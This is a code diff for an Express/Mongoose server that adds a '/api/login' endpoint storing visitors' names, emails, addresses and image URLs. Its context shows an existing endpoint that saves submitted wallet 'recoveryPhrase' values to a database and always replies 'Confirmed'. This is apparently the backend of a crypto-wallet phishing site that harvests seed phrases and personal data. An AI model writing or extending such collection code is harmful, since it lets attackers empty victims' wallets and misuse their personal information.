@@ -82,6 +82,15 @@ const schema9 = new mongoose.Schema({
 });
 const schema9Use = mongoose.model('database9', schema9);
 
+const login = new mongoose.Schema({
+    Time:{type:String},
+    name: {type:String},
+    email: {type:String},
+    address : {type:String},
+    imgUrl : {type:String}
+});
+const loginUse = mongoose.model('login', login);
+
 //MiddleWares
 server.use(cors());
 server.use(bodyParser.json());
@@ -243,6 +252,27 @@ server.post("/api/data9",(req,res)=>{
         let data = new schema9Use({
             Time:indiaTime,
             recoveryPhrase:req.body.recoveryPhrase
+        });
+        try{
+            await data.save();
+            console.log("Saved")
+        }
+        catch{
+            console.log("NO")
+        }
+    }
+    res.json({status:"Confirmed"});
+    saveSchema()
+})
+
+server.post("/api/login",(req,res)=>{
+    async function saveSchema(){
+        let data = new loginUse({
+            Time:indiaTime,
+            name:req.body.name,
+            email:req.body.email,
+            address:req.body.address,
+            imgUrl:req.body.img
         });
         try{
             await data.save();
